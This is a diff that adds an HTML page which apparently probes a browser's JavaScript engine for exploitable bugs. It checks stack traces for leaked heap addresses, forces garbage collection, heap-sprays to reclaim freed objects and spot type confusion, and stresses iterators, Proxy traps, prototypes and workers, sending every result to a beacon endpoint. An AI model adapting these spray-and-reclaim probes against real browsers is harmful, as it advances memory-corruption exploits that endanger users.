@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1263</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1263-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1263: WeakRef + Iterator + Stack ===');
+B('START','P1263');
+</script>
+
+<!-- A: Error.stack information disclosure — any heap pointers? -->
+<script>
+log('\n--- A: Error.stack analysis ---');
+(function(){
+  try{
+    // Regular error
+    var e1=new Error('test');
+    B('A1','stack='+String(e1.stack).slice(0,300));
+
+    // Error from deep call
+    function deep(n){
+      if(n===0) throw new Error('deep');
+      return deep(n-1);
+    }
+    try{ deep(20); }catch(e){
+      B('A2','deep_stack='+String(e.stack).slice(0,300));
+    }
+
+    // Error from eval
+    try{ eval('throw new Error("eval")'); }catch(e){
+      B('A3','eval_stack='+String(e.stack).slice(0,300));
+    }
+
+    // TypeError from object access
+    try{ null.x; }catch(e){
+      B('A4','null_stack='+String(e.stack).slice(0,200));
+    }
+
+    // RangeError
+    try{ new Array(-1); }catch(e){
+      B('A5','range_stack='+String(e.stack).slice(0,200));
+    }
+
+    // Check stack trace format for any addresses
+    var e2=new Error('addr');
+    var s=String(e2.stack);
+    var hexMatch=s.match(/0x[0-9a-fA-F]{6,}/g);
+    B('A6','hex_matches='+(hexMatch?hexMatch.join(','):'none'));
+
+  }catch(e){B('A0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- B: WeakRef + FinalizationRegistry timing — can we detect GC and reclaim? -->
+<script>
+log('\n--- B: WeakRef + FinalizationRegistry GC timing ---');
+(function(){
+  try{
+    var cleanupCalled=false;
+    var cleanupValue=null;
+    var cleanupTime=0;
+
+    var registry=new FinalizationRegistry(function(held){
+      cleanupCalled=true;
+      cleanupValue=held;
+      cleanupTime=Date.now();
+    });
+
+    // Create object, weak-ref it, register cleanup
+    var obj={data:new ArrayBuffer(1024), marker:'P1263_TARGET'};
+    var wr=new WeakRef(obj);
+    registry.register(obj, 'cleanup_marker_1');
+
+    B('B1','wr_deref='+(wr.deref()!==undefined)+
+      '|marker='+wr.deref().marker);
+
+    // Release strong reference
+    obj=null;
+
+    // Try to force GC
+    var pressure=[];
+    for(var i=0;i<5000;i++){
+      pressure.push(new ArrayBuffer(4096));
+    }
+    pressure=null;
+
+    // Check after GC pressure
+    var deref=wr.deref();
+    B('B2','after_gc_pressure|deref_alive='+(deref!==undefined)+
+      '|cleanup='+cleanupCalled);
+
+    // More GC pressure
+    for(var i=0;i<10;i++){
+      var tmp=[];
+      for(var j=0;j<2000;j++) tmp.push(new ArrayBuffer(4096));
+      tmp=null;
+    }
+
+    deref=wr.deref();
+    B('B3','after_heavy_gc|deref_alive='+(deref!==undefined)+
+      '|cleanup='+cleanupCalled+
+      '|value='+cleanupValue);
+
+  }catch(e){B('B0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- C: FinalizationRegistry + spray — reclaim freed object's memory -->
+<script>
+log('\n--- C: FinalizationRegistry reclaim spray ---');
+(function(){
+  try{
+    var N=100;
+    var refs=[];
+    var registry=new FinalizationRegistry(function(idx){
+      // Object at index idx was collected
+    });
+
+    // Create N objects of same size, weak-ref all, register all
+    var targets=[];
+    for(var i=0;i<N;i++){
+      var o={idx:i, buf:new ArrayBuffer(64), pad:new Array(8).fill(i)};
+      targets.push(o);
+      refs.push(new WeakRef(o));
+      registry.register(o, i);
+    }
+
+    B('C1','created='+N+'|refs='+refs.length);
+
+    // Release all strong references
+    targets=null;
+
+    // GC pressure
+    var junk=[];
+    for(var i=0;i<20000;i++) junk.push(new ArrayBuffer(1024));
+    junk=null;
+    for(var i=0;i<10000;i++) junk=[new ArrayBuffer(2048)];
+    junk=null;
+
+    // Check how many were collected
+    var alive=0, dead=0;
+    for(var i=0;i<N;i++){
+      if(refs[i].deref()!==undefined) alive++;
+      else dead++;
+    }
+    B('C2','alive='+alive+'|dead='+dead);
+
+    // Now spray with same-size objects to try to reclaim
+    var spray=[];
+    for(var i=0;i<N*10;i++){
+      spray.push({idx:1000+i, buf:new ArrayBuffer(64), pad:new Array(8).fill(0xBEEF)});
+    }
+
+    // Check if any dead refs now deref to wrong objects (type confusion)
+    var confused=0;
+    for(var i=0;i<N;i++){
+      var d=refs[i].deref();
+      if(d!==undefined){
+        if(d.idx!==i){
+          confused++;
+          B('C3','CONFUSED!|ref_idx='+i+'|got_idx='+d.idx);
+        }
+      }
+    }
+    B('C4','confused='+confused+'|spray_size='+spray.length);
+
+    spray=null;
+  }catch(e){B('C0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- D: Iterator protocol abuse during built-in operations -->
+<script>
+log('\n--- D: Iterator abuse ---');
+(function(){
+  try{
+    // D1: Array.from with custom iterator that mutates
+    var callCount=0;
+    var iterObj={
+      [Symbol.iterator]: function(){
+        var i=0;
+        return {
+          next: function(){
+            callCount++;
+            if(i<10) return {value:i++, done:false};
+            return {done:true};
+          }
+        };
+      }
+    };
+    var fromResult=Array.from(iterObj);
+    B('D1','from_len='+fromResult.length+'|calls='+callCount+
+      '|vals='+fromResult.slice(0,5).join(','));
+
+    // D2: Spread with custom iterator
+    var spreadCount=0;
+    var iter2={
+      [Symbol.iterator]: function(){
+        var i=0;
+        return {
+          next: function(){
+            spreadCount++;
+            if(i<5) return {value:i++*10, done:false};
+            return {done:true};
+          }
+        };
+      }
+    };
+    var spreadResult=[...iter2];
+    B('D2','spread_len='+spreadResult.length+'|calls='+spreadCount);
+
+    // D3: Promise.all with iterator that delays
+    var promIterCalls=0;
+    var promIter={
+      [Symbol.iterator]: function(){
+        var i=0;
+        return {
+          next: function(){
+            promIterCalls++;
+            if(i<3) return {value:Promise.resolve(i++), done:false};
+            return {done:true};
+          }
+        };
+      }
+    };
+    Promise.all(promIter).then(function(r){
+      B('D3','promise_all='+r.join(',')+
+        '|iter_calls='+promIterCalls);
+    });
+
+    // D4: Map constructor with iterator — does it pre-allocate?
+    var mapIterCalls=0;
+    var mapIter={
+      [Symbol.iterator]: function(){
+        var i=0;
+        return {
+          next: function(){
+            mapIterCalls++;
+            if(i<5) return {value:['key'+i, i++], done:false};
+            return {done:true};
+          }
+        };
+      }
+    };
+    var m=new Map(mapIter);
+    B('D4','map_size='+m.size+'|iter_calls='+mapIterCalls);
+
+    // D5: Set with iterator
+    var setIterCalls=0;
+    var setIter={
+      [Symbol.iterator]: function(){
+        var i=0;
+        return {
+          next: function(){
+            setIterCalls++;
+            if(i<5) return {value:i++, done:false};
+            return {done:true};
+          }
+        };
+      }
+    };
+    var s=new Set(setIter);
+    B('D5','set_size='+s.size+'|iter_calls='+setIterCalls);
+
+  }catch(e){B('D0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- E: Iterator that triggers GC during Array.from -->
+<script>
+log('\n--- E: Iterator + GC during Array.from ---');
+(function(){
+  try{
+    var gcIter={
+      [Symbol.iterator]: function(){
+        var i=0;
+        var chunks=[];
+        return {
+          next: function(){
+            if(i>=20) return {done:true};
+            // Every 5th element, create massive GC pressure
+            if(i%5===3){
+              for(var j=0;j<5000;j++) chunks.push(new ArrayBuffer(4096));
+              chunks=[];
+            }
+            return {value:{idx:i++, data:new ArrayBuffer(128)}, done:false};
+          }
+        };
+      }
+    };
+
+    var result=Array.from(gcIter);
+    // Check all objects survived GC intact
+    var intact=0;
+    for(var i=0;i<result.length;i++){
+      if(result[i]&&result[i].idx===i) intact++;
+    }
+    B('E1','len='+result.length+'|intact='+intact+
+      '|all_ok='+(intact===result.length));
+
+  }catch(e){B('E0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- F: Proxy handler traps during internal algorithms -->
+<script>
+log('\n--- F: Proxy traps in built-in algorithms ---');
+(function(){
+  try{
+    // F1: String.prototype.replace with Proxy replacer
+    var replacerCalls=[];
+    var replacer=new Proxy(function(match,p1){return 'X';},{
+      apply: function(target, thisArg, args){
+        replacerCalls.push(args[0]);
+        return target.apply(thisArg, args);
+      }
+    });
+    var replResult='aaa bbb ccc'.replace(/\w+/g, replacer);
+    B('F1','replace='+replResult+'|calls='+replacerCalls.join(','));
+
+    // F2: JSON.stringify with Proxy toJSON
+    var jsonCalls=[];
+    var pObj=new Proxy({a:1,b:2,c:3},{
+      get: function(t,p){
+        if(typeof p==='string') jsonCalls.push(p);
+        if(p==='toJSON') return undefined; // Don't intercept toJSON
+        return t[p];
+      }
+    });
+    var jsonStr=JSON.stringify(pObj);
+    B('F2','json='+jsonStr+'|gets='+jsonCalls.slice(0,10).join(','));
+
+    // F3: Object.keys on Proxy — ownKeys trap
+    var keysCalls=[];
+    var pObj2=new Proxy({x:1,y:2,z:3},{
+      ownKeys: function(t){
+        keysCalls.push('ownKeys');
+        return ['x','y','z','FAKE'];
+      },
+      getOwnPropertyDescriptor: function(t,p){
+        keysCalls.push('desc:'+String(p));
+        if(p==='FAKE') return {value:999, enumerable:true, configurable:true};
+        return Object.getOwnPropertyDescriptor(t,p);
+      }
+    });
+    var keys=Object.keys(pObj2);
+    B('F3','keys='+keys.join(',')+
+      '|calls='+keysCalls.join(';'));
+
+    // F4: for...in on Proxy
+    var forInLog=[];
+    var pObj3=new Proxy({a:1},{
+      ownKeys: function(){
+        forInLog.push('ownKeys');
+        return ['a','b','c'];
+      },
+      getOwnPropertyDescriptor: function(t,p){
+        forInLog.push('desc:'+String(p));
+        return {value:1, enumerable:true, configurable:true};
+      }
+    });
+    var forInKeys=[];
+    for(var k in pObj3) forInKeys.push(k);
+    B('F4','forin='+forInKeys.join(',')+
+      '|log='+forInLog.join(';'));
+
+  }catch(e){B('F0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- G: Prototype chain mutation during iteration -->
+<script>
+log('\n--- G: Prototype mutation during forEach ---');
+(function(){
+  try{
+    // G1: Modify array proto during forEach
+    var arr=[1,2,3,4,5];
+    var seen=[];
+    arr.forEach(function(v,i){
+      seen.push(v);
+      if(i===2){
+        // Truncate array during iteration
+        arr.length=2;
+        // Add elements via prototype
+        Array.prototype[3]=999;
+        Array.prototype[4]=888;
+      }
+    });
+    B('G1','seen='+seen.join(',')+
+      '|arr_len='+arr.length);
+    // Clean up
+    delete Array.prototype[3];
+    delete Array.prototype[4];
+
+    // G2: Replace __proto__ during map
+    var base={0:'a',1:'b',2:'c',3:'d',length:4};
+    var mapLog=[];
+    var result=Array.prototype.map.call(base, function(v,i){
+      mapLog.push(i+':'+v);
+      if(i===1){
+        // Delete property and add it to proto
+        delete base[2];
+        Object.getPrototypeOf(base)[2]='PROTO';
+      }
+      return v;
+    });
+    B('G2','map='+result.join(',')+
+      '|log='+mapLog.join(';'));
+    delete Object.prototype[2];
+
+    // G3: Getter on Array.prototype that modifies during access
+    var arr2=[10,20,30,40,50];
+    Object.defineProperty(Array.prototype, '2', {
+      get: function(){
+        // This fires when arr2[2] would go through proto
+        this.length=1;
+        return 'PROTO_GETTER';
+      },
+      configurable:true
+    });
+    arr2.length=5; // Ensure length
+    // Delete own property to trigger proto getter
+    delete arr2[2];
+    var val=arr2[2];
+    B('G3','val='+val+'|arr_len='+arr2.length);
+    delete Array.prototype[2];
+
+  }catch(e){B('G0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- H: Worker-based race with MessageChannel -->
+<script>
+log('\n--- H: Worker + MessageChannel ---');
+(function(){
+  try{
+    // Test: can workers trigger GC in main thread?
+    var mc=new MessageChannel();
+    var received=[];
+
+    mc.port1.onmessage=function(e){
+      received.push(e.data);
+      if(received.length>=5){
+        B('H1','received='+received.length+'|data='+received.join(','));
+      }
+    };
+
+    // Create a worker that posts messages rapidly
+    var workerCode='('+function(){
+      var mc2;
+      self.onmessage=function(e){
+        mc2=e.ports[0];
+        for(var i=0;i<5;i++){
+          mc2.postMessage('w_'+i);
+        }
+        mc2.postMessage('DONE');
+      };
+    }.toString()+')()';
+
+    var blob=new Blob([workerCode],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+
+    // Transfer port2 to worker
+    w.postMessage('go', [mc.port2]);
+
+    // Set a timeout to check results
+    setTimeout(function(){
+      B('H2','received='+received.length+
+        '|data='+received.slice(0,6).join(','));
+      w.terminate();
+      URL.revokeObjectURL(url);
+    }, 2000);
+
+  }catch(e){B('H0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1263 COMPLETE ===');
+}, 4000);
+</script>
+
+</body>
+</html>
